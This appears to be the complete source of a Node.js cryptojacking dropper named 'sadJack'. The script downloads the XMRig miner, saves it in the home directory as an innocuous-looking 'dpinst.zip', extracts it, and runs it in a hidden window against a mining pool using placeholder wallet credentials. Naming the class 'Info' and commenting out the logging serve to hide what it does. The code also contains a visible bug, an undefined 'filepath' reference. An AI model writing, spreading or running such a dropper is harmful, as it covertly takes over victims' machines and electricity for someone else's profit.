const fs = require('fs');
const https = require('https');
const unzipper = require('unzipper');
const { spawn } = require('child_process');

class Info {
  constructor() {
    this.url = 'https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-msvc-win64.zip';
    this.destFolder = './';
  }

  async set() {
    // console.log('properties set done');
  }

  async downloader() {
    const path = require('os').homedir();

    try {
      process.chdir(path);
    } catch (err) {
      console.error(err);
    }

    const file = fs.createWriteStream('dpinst.zip');

    const response = await new Promise((resolve, reject) => {
      https.get(this.url, resolve).on('error', reject);
    });

    response.pipe(file);

    await new Promise((resolve, reject) => {
      file.on('finish', resolve);
      file.on('error', reject);
    });

    this.file = file;

    // console.log('downloader done');
  }

  async extractor() {
    const filenames = [];
    const destFolder = this.destFolder;

    const directory = await fs.promises.opendir(destFolder);

    for await (const dirent of directory) {
      filenames.push(dirent.name);
    }

    const file = await unzipper.Open.file(this.file.name);

    for (const entry of file.files) {
      const filePath = `${destFolder}/${entry.path}`;
      filenames.push(filePath);

      if (entry.type === 'Directory') {
        this.minerName = entry.path;
        await fs.promises.mkdir(filePath, { recursive: true });
      } else {
        await fs.promises.mkdir(filepath.dirname(filePath), { recursive: true });

        const destFile = fs.createWriteStream(filePath);

        await new Promise((resolve, reject) => {
          entry.stream().pipe(destFile).on('close', resolve).on('error', reject);
        });

        // console.log('Extracting...');
      }
    }

    // console.log('done extracting');
  }

  async starter() {
    const path = '/';
    const dest = this.destFolder;
    const mname = this.minerName;
    const dr = process.cwd();

    process.chdir(`${dr}${path}${dest}${path}${mname}${path}`);

    const cmdInstance = spawn('cmd', ['/c', `${dr}${path}${dest}${path}${mname}${path}xmrig.exe`, '--url', 'pool.example.sadjack:80', '--user', 'wallet address', '--pass', 'password'], { windowsHide: true });

    cmdInstance.on('error', (err) => {
      console.error(err);
    });

    cmdInstance.stdout.on('data', (data) => {
      console.log(data.toString());
    });

    cmdInstance.stderr.on('data', (data) => {
      console.error(data.toString());
    });
  }
}

async function main() {
  const mine = new Info();
  await mine.set();
  await mine.downloader();
  await mine.extractor();
  console.log('sadJack running...');
  await mine.starter();
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
